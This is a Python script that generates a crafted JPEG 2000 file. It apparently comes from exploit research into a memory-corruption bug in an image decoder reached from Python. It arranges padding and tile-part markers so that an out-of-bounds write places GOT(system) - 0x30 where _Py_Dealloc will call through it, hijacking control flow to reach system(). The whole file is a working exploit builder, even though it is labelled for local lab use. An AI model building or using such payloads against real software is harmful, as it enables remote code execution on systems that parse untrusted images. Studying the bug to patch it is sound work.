#!/usr/bin/env python3
"""Build the GOT-target variant of the pinned public PoC.

Same shape as make-chosen-call.py, but the COM pad is derived from a requested
write value: the first OOB store at tile part EVIL is intended to write WANT.
The harness measures the realized WANT and corrects it once, so no build-specific
bias is hard-coded. The chosen value is GOT(system) - 0x30: _Py_Dealloc loads
ob_type, then calls *(ob_type + 0x30), which is the GOT slot for system.

Usage: make-got-target.py SRC.j2k OUT.j2k WANT EVIL N1 N2
Local lab use only; no external target.
"""
import sys

src, dst, want, evil, n1, n2 = (
    sys.argv[1], sys.argv[2], int(sys.argv[3], 0),
    int(sys.argv[4]), int(sys.argv[5]), int(sys.argv[6]),
)
pstart = 60
orig = bytearray(open(src, 'rb').read())
hdr = bytes(orig[:0x76])
first = bytes(orig[0x76:0x91])
tail = bytes(orig[0xad:])


def sot(i, payload=0):
    return (b'\xff\x90\x00\x0a\x00\x00' + (14 + payload).to_bytes(4, 'big')
            + bytes([i, 0]) + b'\xff\x93' + b'B' * payload)


def sod(k, pad_len):
    return (len(hdr) + pad_len + len(first) + n1 + (k - 1) * 14
            + (n2 if k > pstart else 0) + 12)


fixed = len(hdr) + len(first) + n1 + (evil - 1) * 14 + n2 + 12
pad_len = want - fixed
assert pad_len > 0, (want, fixed)
segs, left = [], pad_len
while left > 0:
    m = min(left - 6, 65531)
    segs.append(b'\xff\x64' + (4 + m).to_bytes(2, 'big') + b'\x00\x00' + b'A' * m)
    left -= 6 + m
pad = b''.join(segs)
assert len(pad) == pad_len
parts = [sot(i, n1 if i == 1 else (n2 if i == pstart else 0))
         for i in range(1, evil + 1)]
out = hdr + pad + first + b''.join(parts) + tail
open(dst, 'wb').write(out)
print('N1=%d N2=%d EVIL=%d PAD=%d LEN=%d WANT=%#x SOD=%#x'
      % (n1, n2, evil, pad_len, len(out), want, sod(evil, pad_len)))
